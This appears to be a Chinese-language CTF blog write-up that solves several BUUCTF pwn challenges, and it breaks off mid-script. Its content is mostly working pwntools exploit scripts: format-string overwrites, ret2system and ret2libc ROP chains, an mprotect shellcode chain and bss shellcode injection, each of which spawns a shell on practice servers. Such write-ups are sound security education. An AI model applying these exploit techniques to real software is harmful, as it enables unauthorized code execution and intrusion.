href="#第五空间2019-决赛-PWN5-格式化字符串" class="headerlink" title="[第五空间2019 决赛]PWN5(格式化字符串)"></a>[第五空间2019 决赛]PWN5(格式化字符串)</h2><p>试着运行一下先，发现当输入的长度比较长的时候，回显会出现一点问题，所以合理猜测输出语句存在问题。<br><img src="https://image.0error.net/img/202220220610204552.png" alt="out"><br>使用32位IDA载入，直接查看main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [esp+0h] [ebp-84h]</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+4h] [ebp-80h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span><br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v1 = time(<span class="hljs-number">0</span>);<br>  srand(v1);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(<span class="hljs-number">0x14</span>u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先看了看栈溢出漏洞，read做了限制字符大小利用不了，但是看到了一个<code>printf(buf)</code>这就是一个明显的格式化字符漏洞，再结合题目分析一波，大概流程是随机生成一个数字存入到地址为<code>dword_804C044</code>的全局变量中，最后对输入的<code>passwd</code>字符进行比较，这里注意下<code>atoi</code>这个函数它只会提取正整数，除此之外都是返回0，因为<code>dword</code>变量是随机数，所以控制不了（之前见过一题也是随机数，但是它的随机种子在栈里面是可控的，然后用栈溢出，再引用<code>ctypes</code>库，加载<code>libc.so.6</code>然后就可以获得系统一样的随机数了），但是这题很明显就是通过<code>printf(buf)</code>这个漏洞去更改<code>dword</code>变量的值<br>关于格式化字符串攻击，这里可以从以下两个资料着手了解<br><a href="https://www.cnblogs.com/0xJDchen/p/5904816.html">详谈Format String</a><br><a href="https://sec.mrfan.xyz/2018/10/23/%E3%80%90%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">【整理笔记】格式化字符串漏洞梳理</a><br>利用<code>AAAA %08x %08x %8x %08x %08x %08x %08x...</code>这样的字符串来找到我们输入的参数在函数栈上的位置<br>假设是在栈中的第n位，则可利用<code>%n$</code>定位到参数在栈上的位置，特别值得一提的是，这里的%n中如果是n则默认只想ESP指向的栈顶的内容指向的内存地址，而如果是一个具体的数值x则是指向[ESP+x]<br>因此在这道题中，我们就可以把我们不知道的<code>dword_804C044</code>改为我们设定的数值即可，由此编写poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28042</span>)<br><br>addr=<span class="hljs-number">0x0804C044</span><br>payload=p32(addr)+p32(addr+<span class="hljs-number">1</span>)+p32(addr+<span class="hljs-number">2</span>)+p32(addr+<span class="hljs-number">3</span>)<br>payload+=<span class="hljs-string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br>p.sendline(payload)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>最终得到flag  </p><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>打开之后查main函数逻辑，然后你就会发现原来是一道水题- -，只要保证var数组第14位为0x11即可getshell，直接什么都不看编写poc梭哈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27097</span>)<br><br><span class="hljs-comment">#addr=0x0804C044</span><br>payload=p32(<span class="hljs-number">0x11</span>)*<span class="hljs-number">14</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>梭哈成功✌</p><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>IDA分析，<code>vulnerable_function</code>中有关于buf的read函数，且buf距离<code>ebp</code>长度为0x88，而read指定长度为0x100，再经过checksec查看，确认存在栈溢出漏洞。<br>查看字符串发现程序内已经包含了<code>/bin/sh</code>字符串且具有system函数，因此溢出思路为填充buf跳转到system函数，然后传入字符串<code>/bin/sh</code>作为参数即可getshell，编写poc如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28037</span>)<br><br>binsh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x8048320</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>成功打通，cat flag</p><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>初期逻辑和前面一道题比较像，buf给一个随机数，然后拿用户输入与buf进行比较，显然这里没有利用空间。<br><img src="https://image.0error.net/img/202220220611171440.png" alt="main"><br><img src="https://image.0error.net/img/202220220611171133.png" alt="804871F"><br>在sub_804871F函数里面很明显看到有<code>strlen(buf)</code>，这里有一个利用点，即strlen遇到<code>\x00</code>时直接截断，所以我们第一位直接截断即可绕过此部分，然后发现buf是一个7位数饿数组，但是在函数中有<code>read(0, buf, 0x20u)</code>，经计算，v5就相当于buf的第8位，所以v5在这里可以被我们指定。<br><img src="https://image.0error.net/img/202220220611171355.png"><br>而另一个函数sub_80487D0中a1就是main函数中传入的v5，buf的地址为[ebp-E7],如果v5为127，则会执行第一条代码，C8&lt;E7,不能覆盖返回地址，v5需要尽可能的大，才能覆盖到返回地址。<br>根据上述思路，进行exp编写，这里一开始是想在绕过之后利用read&#x2F;write泄露地址然后通过LibcSearcher找到libc版本号的，但是发现不是很成功…通过泄露的地址未能找到正确的libc，结果回头一看题目里面已经给出libc了- -既然如此那就直接用了。真可谓众里寻他千百度，得来全不费工夫，最后把LibcSearcher的部分注释了，<del>也算是一种复习吧</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28820</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>system_libc=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_libc=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_libc=libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>main_addr=<span class="hljs-number">0x8048825</span><br><br><span class="hljs-comment">#payload1-截断strlen</span><br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#pay;pad2 - 泄露read的got地址</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main_addr)<br><span class="hljs-comment">#                        ret1          ret2</span><br>payload+=p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#write     par1     par2        par3</span><br><span class="hljs-comment">#write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数</span><br>p.sendline(payload)<br><br>write_addr=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]write_addr: &#x27;</span>, <span class="hljs-built_in">hex</span>(write_addr))<span class="hljs-comment">#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置</span><br><br><span class="hljs-comment"># libc=LibcSearcher(&#x27;read&#x27;, read_addr)</span><br><span class="hljs-comment"># libc_base=read_addr-libc.dump(&#x27;read&#x27;)</span><br><span class="hljs-comment"># system_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-comment"># binsh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br>libc_base=write_addr-write_libc<br>system_addr=system_libc+libc_base<br>binsh_addr=binsh_libc+libc_base<br><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">4</span>)<br>payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)<span class="hljs-comment">#第二次直接把返回地址改为addr地址</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>checksec发现开了NX保护，所以栈内容执行不可用，考虑找其他后门函数，搜索flag关键字发现get_flag函数，打开发现是读取flag.txt，所以考虑只需要把return地址改在get_flag函数的if条件句之后即可正常执行，这里注意到main函数时候没有push ebp，所以在压进去0x38字节以后就直接到了return地址处，写出exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p32(80489B8)<br></code></pre></td></tr></table></figure><p>本地可以打通，但是连到buu远程发现提示core dumped，猜测是远程有内核保护机制，因此就只能尝试保证堆栈平衡的情况下进行处理了</p><h3 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27394</span>)<br><span class="hljs-comment"># 0x38 + get_flag入口 + exit地址维持堆栈平衡 + 传参a1, a2</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p32(<span class="hljs-number">0x80489A0</span>) + p32(<span class="hljs-number">0x804E6A0</span>) + p32(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">814536271</span>), <span class="hljs-number">16</span>)) + p32(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">425138641</span>), <span class="hljs-number">16</span>))<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h3><p>第二种是看到大佬的WP才知道的，还可以通过vmprotect来修改某块内存地址的读写权限来执行shell的，函数的具体情况如下</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *startaddr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure><p>startaddr 内存起始地址, len修改内存的长度, prot 内存的权限</p><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址startaddr必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。0x1000&#x3D;4096</p><p>prot &#x3D; 7 表示可读可写可执行4+2+1&#x3D;7（r&#x3D;4，w&#x3D;2，x&#x3D;1）</p></blockquote><p>接着去找内存bss段的一段可用内存，这里我们使用gdb查找</p><p><img src="https://image.0error.net/img/2022/20220925184502.png"></p><p>可以看到0x080ea000到0x080ec000这一段是可读可写不可执行的，正符合我们的要求，所以我们就拿这一段来下手</p><p>由于在这个过程中我们分别要在mprotect和read里面输入三个参数，都需要维持栈平衡，所以我们需要找到一个进行三次pop的ROP，确保对战还原，程序正常运行，使用ROPgadget查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary get_started --only &#x27;pop|ret&#x27; | grep pop<br></code></pre></td></tr></table></figure><p>找到了地址<code>0x0804f460</code>有3pop+ret结构，符合我们的要求，因此就用它了</p><p>到这里，我们的思路就基本明确了：首先从main函数跳转到mprotect函数，改变指定内存段的读写权限，然后再跳转到read函数，设置读取后将内容保存在前面修改过的内存地址里面，接着我们传入shellcode，获取flag即可，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>elf=ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27394</span>)<br><br>pop3_ret = <span class="hljs-number">0x0804f460</span><br><br>mem_addr = <span class="hljs-number">0x080ea000</span><br>mem_size = <span class="hljs-number">0x2000</span><span class="hljs-comment">#根据差值计算</span><br>mem_proc = <span class="hljs-number">0x7</span><span class="hljs-comment">#777</span><br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><span class="hljs-comment">#payload = b&#x27;a&#x27;*0x38 + p32(0x80489A0) + p32(0x804E6A0) + p32(int(hex(814536271), 16)) + p32(int(hex(425138641), 16))</span><br><span class="hljs-comment">#覆盖+跳转地址到mprotect+pop3_ret</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p32(mprotect_addr) + p32(pop3_ret)<br><span class="hljs-comment">#mprotect的参数</span><br>payload += p32(mem_addr) + p32(mem_size) + p32(mem_proc)<br>payload += p32(read_addr) + p32(pop3_ret)<br><span class="hljs-comment">#read 的三个参数 read(0,0x080ea000,0x100)</span><br><span class="hljs-comment">#read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址</span><br><span class="hljs-comment">#读取到的内容复制到指向的内存里</span><br>payload += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#读取大小</span><br>payload += p32(<span class="hljs-number">0</span>) + p32(mem_addr) + p32(<span class="hljs-number">0x100</span>)<br><br>payload += p32(mem_addr) <span class="hljs-comment">#ret esi</span><br><br><span class="hljs-comment">#p.sendline(&#x27;100&#x27;)</span><br>p.sendline(payload)<br>shellcode = asm(shellcraft.sh(),arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p.sendline(shellcode)<br></code></pre></td></tr></table></figure><h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>题目拿到手分析有NX保护，排除栈内shellcode一类，打开一看，还是栈溢出，基本轻车熟路了，看到有system可以调用，又看到.data表里面有<code>/bin/sh</code>可以调用，那就直接开搓</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p=process(&#x27;./level2_x64&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28117</span>)<br><br>pop_rdi_ret_addr=<span class="hljs-number">0x00000000004006b3</span><br>system_addr=<span class="hljs-number">0x40063E</span><br>binsh_addr=<span class="hljs-number">0x600A90</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)<br><span class="hljs-comment">#p.sendline(&#x27;100&#x27;)</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>老花样，栈溢出找到system调用&#x2F;bin&#x2F;sh即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p=process(&#x27;./level2_x64&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26354</span>)<br><br>system_addr = <span class="hljs-number">0x4005E3</span><br>rdi_ret_addr = <span class="hljs-number">0x0000000000400683</span><br>binsh_addr = <span class="hljs-number">0x601048</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>保护全关，第一段输入将shellcode写入bss，第二段利用溢出修改返回地址执行shell即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ciscn_2019_n_5&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019_n_5&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27642</span>)<br><br>bss_addr=<span class="hljs-number">0x601080</span><br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(bss_addr)<br><br>p.recvuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.sendline(shellcode)<br>p.recvuntil(<span class="hljs-string">&#x27;?&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>这是个啥题啊，直接nc连上就shell了，自始至终都觉得哪里不对劲，但是flag提交成功…</p><h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>这题目有意思，前面都平平无奇，打开以后发现通过admin校验以后可以输出和输出内容，而输入大小是128，最后输出时候使用strcpy存入的数组大小明显小于此值，因此可以构成栈溢出，修改返回地址到system，这里没有<code>/bin/sh</code>字符串，但是有一个<code>fflush</code>可以构造出<code>sh</code>，居然也可以用，新的知识点++，到这里就直接开写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span><br><br><span class="hljs-comment">#p=process(&#x27;./ciscn_2019_ne_5&#x27;)</span><br>e=ELF(<span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27192</span>)<br><br><span class="hljs-comment">#binsh_addr=0x080482EA</span><br>ret_addr=<span class="hljs-number">0x0804843e</span><br>popebp_ret_addr=<span class="hljs-number">0x08048720</span><br>binsh_addr=<span class="hljs-number">0x080482ea</span><br>system_addr=e.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;word:&#x27;</span>, <span class="hljs-string">&#x27;administrator&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span> + <span class="hljs-number">0x4</span>) + p32(system_addr) + p32(binsh_addr) + p32(binsh_addr)<br>p.sendline(payload)<br>p.sendlineafter(<span 